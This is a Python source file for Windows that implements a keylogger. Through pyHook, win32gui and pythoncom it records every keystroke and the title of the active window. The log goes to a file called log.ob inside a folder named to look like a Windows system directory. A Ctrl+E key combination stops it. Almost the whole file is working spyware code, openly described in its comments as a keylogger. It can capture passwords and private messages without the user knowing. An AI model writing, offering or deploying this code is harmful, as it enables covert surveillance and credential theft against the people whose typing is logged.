import sys
import pythoncom, pyHook
import win32gui

windowTile = ""
newWindowTile=""

def OnKeyboardEvent(event):
	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
	global windowTile
	global newWindowTile
	newWindowTile = win32gui.GetWindowText (win32gui.GetForegroundWindow())
	if( newWindowTile !=  windowTile ) :
		windowTile = newWindowTile
		#print windowTile
		try:
			f = open (directory_name+'\\log.ob', 'a')
			tabName="\n"+"\n"+"\n"+"[+]->>"+windowTile+"\n"
			f.write(tabName)
			f.close()
		except:
			pass

	strokes={27:'<Esc>',8:"<Backspace>",9:"<Tab>",13:"<Return>"}

	if event.Ascii == 5:        # Press Ctrl+E to terminate the keylogger.
		sys.exit()
	if event.Ascii != 0:
		f = open (directory_name+'\\log.ob', 'a')    #Output file is placed here.
		if strokes.has_key(event.Ascii):
			keylogs=strokes[event.Ascii]
		else:
			keylogs = chr(event.Ascii)
	if event.Ascii == 13:
		keylogs = keylogs + '\n'
	#print event.Ascii
	try:
		f.write(keylogs)
		f.close()
	except:
		pass

def logger():
	while True:
			hm = pyHook.HookManager()
			hm.KeyDown = OnKeyboardEvent
			hm.HookKeyboard()
			pythoncom.PumpMessages()